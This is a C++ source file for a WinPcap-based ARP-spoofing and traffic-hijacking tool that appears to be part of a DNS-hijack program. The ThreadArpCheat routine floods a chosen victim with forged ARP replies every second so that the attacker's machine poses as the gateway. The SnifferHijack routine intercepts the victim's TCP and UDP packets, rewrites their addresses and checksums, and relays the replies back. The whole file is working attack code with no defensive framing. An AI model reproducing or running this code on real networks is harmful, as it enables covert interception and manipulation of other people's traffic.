

#include <WINSOCK2.H>
#include <windows.h>
#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include <IPHlpApi.h>
#pragma comment(lib,"iphlpapi.lib")
#include "Public.h"
#include "Packet.h"
#include "MainProc.h"
#include "WinpcapDnsHijack.h"
#include <map>


using namespace std;


// typedef struct{
// 	DWORD dwServerIP;
// 	DWORD dwClientPort;
// }MAPHIJACK_PARAM,*LPMAPHIJACK_PARAM;



map < unsigned __int64, unsigned __int64 > mapHijack;
map < unsigned __int64, unsigned __int64 >::iterator mapHijackIt;



int __stdcall ThreadArpCheat(LPARP_CHEAT_PARAM lpParam)
{
	ARP_CHEAT_PARAM stParam =  *lpParam;
	int Result = 0;
	unsigned char	ArpPacket[1024] = {0};
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));
	char lpHijackMac[MAC_ADDRESS_SIZE];
	char lpGateWayMac[MAC_ADDRESS_SIZE];
	char lpLocalMac[MAC_ADDRESS_SIZE];
	unsigned long iMacLen = MAX_PATH;
	Result =SendARP(stParam.dwHijackIP,0, (unsigned long*)lpHijackMac ,&iMacLen);
	if(Result !=NO_ERROR)
	{
		printf("SendARP Error: %d\n",GetLastError());
		return FALSE;
	}	
	iMacLen = MAX_PATH;
	Result = SendARP(stParam.dwGateWayIP,0,(unsigned long*)lpGateWayMac,&iMacLen);
	if(Result !=NO_ERROR)
	{
		printf("SendARP Error: %d\n",GetLastError());
		return FALSE;
	}
	iMacLen = MAX_PATH;
	Result = SendARP(stParam.dwLocalIP,0,(unsigned long*)lpLocalMac,&iMacLen);
	if(Result !=NO_ERROR)
	{
		printf("SendARP Error: %d\n",GetLastError());
		return FALSE;
	}

	while (TRUE)
	{
// 		memmove((char*)MACheader->DstMAC, (char*)stParam.lpGateWayMac, MAC_ADDRESS_SIZE);
// 		memmove((char*)MACheader->SrcMAC, (char*)stParam.lpLocalMac, MAC_ADDRESS_SIZE);
// 		MACheader->Protocol = 0x0608;
// 		ARPheader->HardWareType = 0x0100;
// 		ARPheader->ProtocolType = 0x0008;
// 		ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
// 		ARPheader->ProtocolSize = 4;
// 		ARPheader->Opcode		= 0x0200;
// 		memmove((char*)ARPheader->SenderMac, (char*)stParam.lpLocalMac, MAC_ADDRESS_SIZE);	//fake gateway
// 		memmove(ARPheader->SenderIP ,(unsigned char*)&stParam.dwHijackIP, sizeof(DWORD));
// 		memmove((char*)ARPheader->RecverMac, (char*)stParam.lpGateWayMac, MAC_ADDRESS_SIZE);
// 		memmove(ARPheader->RecverIP , (unsigned char *)&stParam.dwGateWayIP, sizeof(DWORD));
// 		Result = pcap_sendpacket(stParam.pcapMain, ArpPacket, sizeof(ARPHEADER) + sizeof(MACHEADER));
// 		if (Result)
// 		{
// 			printf("pcap_sendpacket error\n");
// 		}

		memmove((char*)MACheader->DstMAC, (char*)lpHijackMac, MAC_ADDRESS_SIZE);
		memmove((char*)MACheader->SrcMAC, (char*)lpLocalMac, MAC_ADDRESS_SIZE);
		MACheader->Protocol = 0x0608;	
		ARPheader->HardWareType = 0x0100;
		ARPheader->ProtocolType = 0x0008;
		ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
		ARPheader->ProtocolSize = 4;
		ARPheader->Opcode		= 0x0200;
		memmove((char*)ARPheader->SenderMac, (char*)lpLocalMac, MAC_ADDRESS_SIZE);
		memmove( ARPheader->SenderIP ,(unsigned char *)&(stParam.dwGateWayIP), sizeof(DWORD));
		memmove((char*)ARPheader->RecverMac, (char*)lpHijackMac, MAC_ADDRESS_SIZE);
		memmove( ARPheader->RecverIP ,(unsigned char *)&stParam.dwHijackIP, sizeof(DWORD));
		Result = pcap_sendpacket(stParam.pcapMain, ArpPacket,sizeof(ARPHEADER) + sizeof(MACHEADER));
		if (Result)
		{
			printf("ThreadArpCheat pcap_sendpacket error\n");
		}
		Sleep(1000);
	}

	return TRUE;
}





WORD CalcChecksum(WORD *buffer,int size)
{
	unsigned long cksum = 0;
	while(1<size)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(0<size)
		cksum += *(UCHAR*)buffer;
	cksum = (cksum>>16) + (cksum&0xffff);
	cksum += (cksum>>16);
	return(unsigned short)(~cksum);
}



USHORT GetSubPacketCheckSum(char * lpCheckSumData,WORD wCheckSumSize,DWORD dwSrcIP,DWORD dwDstIP,byte wProtocol)
{
	char szCheckSumBuf[2048];
	LPCHECKSUMFAKEHEADER lpFakeHdr = (LPCHECKSUMFAKEHEADER)szCheckSumBuf;
	lpFakeHdr->dwSrcIP = dwSrcIP;
	lpFakeHdr->dwDstIP = dwDstIP;
	lpFakeHdr->Protocol = ntohs(wProtocol);
	lpFakeHdr->usLen = ntohs(wCheckSumSize);

	memmove(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER),(char*)lpCheckSumData,wCheckSumSize);

	*(DWORD*)(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER) + wCheckSumSize) = 0;

	unsigned short nCheckSum = CalcChecksum((WORD*)szCheckSumBuf,wCheckSumSize + sizeof(CHECKSUMFAKEHEADER));
	return nCheckSum;
}





//为在某些情况下你不能保证捕获的包是完整的，例如一个包长1480，但是你捕获到1000的时候，可能因为某些原因就中止捕获了，
//所以caplen是记录实际捕获的包长，也就是1000，而len就是1480。
int __stdcall SnifferHijack(LPARP_CHEAT_PARAM lpParam)
{
	ARP_CHEAT_PARAM	stParam = *lpParam;
	pcap_pkthdr *		lpPcapHdr = 0;
	const unsigned char * lpPacket	= 0;
	char szShowInfo[1024];

	while (TRUE)
	{
		int iRet = pcap_next_ex(stParam.pcapMain,&lpPcapHdr,&lpPacket);
		if (iRet == 0)
		{
			continue;
		}
		else if (iRet < 0)
		{
			char * lpError = pcap_geterr(stParam.pcapMain);
			wsprintfA(szShowInfo,"pcap_next_ex return value is 0 or negtive,error description:%s\r\n",lpError);
			printf(szShowInfo);
			continue;
		}

		if (lpPcapHdr->caplen != lpPcapHdr->len)
		{
			printf("pcap_next_ex caplen error\r\n");
			continue;
		}

		if (lpPcapHdr->caplen >= MAX_PACKET_SIZE)
		{
			printf("pcap_next_ex caplen is too large\r\n");
			continue;
		}
		int iCapLen = lpPcapHdr->caplen;

		LPMACHEADER lpMac = (LPMACHEADER)lpPacket;
		if (lpMac->Protocol != 0x0008)
		{
			//printf("pcap_next_ex not mac packet\r\n");
			continue;
		}

		LPIPHEADER lpIPHdr = (LPIPHEADER)(lpPacket + sizeof(MACHEADER) );
		if (lpIPHdr->Version != 4)
		{
			printf("pcap_next_ex not ipv4 packet\r\n");
			continue;
		}

		int iIpHdrLen = (lpIPHdr->HeaderSize << 2);
		LPTCPHEADER lpTcp = 0;
		LPUDPHEADER lpUdp = 0;
		DWORD dwSrcPort = 0;
		DWORD dwDstPort = 0;
		unsigned char * lpCheckSumData = (unsigned char*)(lpPacket + sizeof(MACHEADER) + iIpHdrLen);
		WORD wCheckSumlen = iCapLen - sizeof(MACHEADER) - iIpHdrLen;
		WORD * lpCheckSum = 0;
		byte byteProtocol = lpIPHdr->Protocol;

		if (lpIPHdr->Protocol == IPPROTO_TCP)
		{
			lpTcp = (LPTCPHEADER)(lpPacket + sizeof(MACHEADER) + iIpHdrLen);
			dwSrcPort = lpTcp->SrcPort;
			dwDstPort = lpTcp->DstPort;
			lpCheckSum = &lpTcp->PacketChksum;
		}
		else if (lpIPHdr->Protocol == IPPROTO_UDP)
		{
			lpUdp = (LPUDPHEADER)(lpPacket + sizeof(MACHEADER) + iIpHdrLen);
			dwSrcPort = lpUdp->SrcPort;
			dwDstPort = lpUdp->DstPort;
			lpCheckSum = &lpUdp->PacketChksum;
		}
		else
		{
			continue;
		}

		if (memcmp(lpMac->SrcMAC,stParam.lpHijackMac,MAC_ADDRESS_SIZE) == 0 && lpIPHdr->SrcIP == stParam.dwHijackIP)
		{
			memmove(lpMac->SrcMAC,stParam.lpLocalMac,MAC_ADDRESS_SIZE);
			memmove(lpMac->DstMAC,stParam.lpGateWayMac,MAC_ADDRESS_SIZE);
			lpIPHdr->SrcIP = stParam.dwLocalIP;
			//pIPHdr->DstIP = stParam->dwGateWayIP;

			//MAPHIJACK_PARAM stMapParam = {0};
			//stMapParam.dwServerIP = lpIPHdr->DstIP;
			//stMapParam.dwClientPort =  dwSrcPort;
			//char szIPPort[MAX_PATH];
			//unsigned char * lpIP = (unsigned char*)&(stMapParam.dwServerIP);
			//wsprintfA(szIPPort,"%u.%u.%u.%u_%u",lpIP[0],lpIP[1],lpIP[2],lpIP[3],stMapParam.dwClientPort);

			//LARGE_INTEGER li = {0};
			//li.LowPart = lpIPHdr->DstIP;
			//li.HighPart = dwSrcPort;
			unsigned __int64 i64 = dwSrcPort;
			i64 = (i64 << 32) + lpIPHdr->DstIP;
			mapHijackIt = mapHijack.find(i64);
			if (mapHijackIt == mapHijack.end())
			{
				mapHijack.insert(map<unsigned __int64,unsigned __int64>::value_type(i64,i64));
			}

			lpIPHdr->HeaderChksum	= 0;
			lpIPHdr->HeaderChksum	= CalcChecksum((unsigned short*)lpIPHdr,iIpHdrLen);

			* lpCheckSum	= 0;
			* lpCheckSum	= GetSubPacketCheckSum((char*)lpCheckSumData,wCheckSumlen,lpIPHdr->SrcIP,lpIPHdr->DstIP,byteProtocol);

			iRet = pcap_sendpacket(stParam.pcapMain,lpPacket,iCapLen);
			if (iRet)
			{
				printf("SnifferHijack pcap_sendpacket error\r\n");
			}
			continue;
		}
		else if (memcmp(lpMac->DstMAC,stParam.lpLocalMac,MAC_ADDRESS_SIZE) == 0 && lpIPHdr->DstIP == stParam.dwLocalIP)
		{
			//MAPHIJACK_PARAM stMapParam = {0};
			//stMapParam.dwServerIP = lpIPHdr->SrcIP;
			//stMapParam.dwClientPort =  dwDstPort;

			//char szIPPort[MAX_PATH];
			//unsigned char * lpIP = (unsigned char*)&(stMapParam.dwServerIP);
			//wsprintfA(szIPPort,"%u.%u.%u.%u_%u",lpIP[0],lpIP[1],lpIP[2],lpIP[3],stMapParam.dwClientPort);
			//LARGE_INTEGER li = {0};
			//li.LowPart = lpIPHdr->SrcIP;
			//li.HighPart = dwDstPort;
			unsigned __int64 i64 = dwDstPort;
			i64 = (i64 << 32) + lpIPHdr->SrcIP;
			mapHijackIt = mapHijack.find(i64);
			if (mapHijackIt != mapHijack.end())
			{
				memmove(lpMac->SrcMAC,stParam.lpLocalMac,MAC_ADDRESS_SIZE);
				memmove(lpMac->DstMAC,stParam.lpHijackMac,MAC_ADDRESS_SIZE);
				//lpIPHdr->SrcIP = stParam->dwLocalIP;
				lpIPHdr->DstIP = stParam.dwHijackIP;

				lpIPHdr->HeaderChksum	= 0;
				lpIPHdr->HeaderChksum	= CalcChecksum((unsigned short*)lpIPHdr,iIpHdrLen);

				* lpCheckSum	= 0;
				* lpCheckSum	= GetSubPacketCheckSum((char*)lpCheckSumData,wCheckSumlen,lpIPHdr->SrcIP,lpIPHdr->DstIP,byteProtocol);

				iRet = pcap_sendpacket(stParam.pcapMain,lpPacket,iCapLen);
				if (iRet)
				{
					printf("SnifferHijack pcap_sendpacket error\r\n");
				}
				continue;
			}
			else{
				continue;
			}
		}
		else
		{
			continue;
		}
	}
	return TRUE;
}